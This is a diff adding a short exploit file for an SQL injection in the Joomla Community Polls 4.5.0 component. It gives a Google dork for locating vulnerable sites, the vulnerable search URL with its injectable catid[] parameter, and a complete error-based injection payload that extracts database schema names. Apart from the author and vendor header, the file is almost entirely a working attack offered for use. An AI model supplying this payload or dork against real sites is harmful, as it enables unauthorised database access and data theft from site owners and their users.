@@ -1,0 +1,19 @@
+# # # # # 
+# Exploit Title: Joomla! Component Community Polls v4.5.0 - SQL Injection
+# Google Dork: inurl:index.php?option=com_communitypolls
+# Date: 24.02.2017
+# Vendor Homepage: http://corejoomla.com/
+# Software Buy: https://extensions.joomla.org/extensions/extension/contacts-and-feedback/polls/community-polls/
+# Demo: http://demo.corejoomla.com/polls.html
+# Version: 4.5.0
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# index.php?option=com_communitypolls&view=search
+# http://localhost/[PATH]/?list_filter=Ihsan_Sencan&list_filter_field=author&filter_all_keywords=1&filter_order=a.catid&filter_order_Dir=desc&catid[]=[SQL]
+# 66+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x496873616e2053656e63616e,0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1
+# # # # #
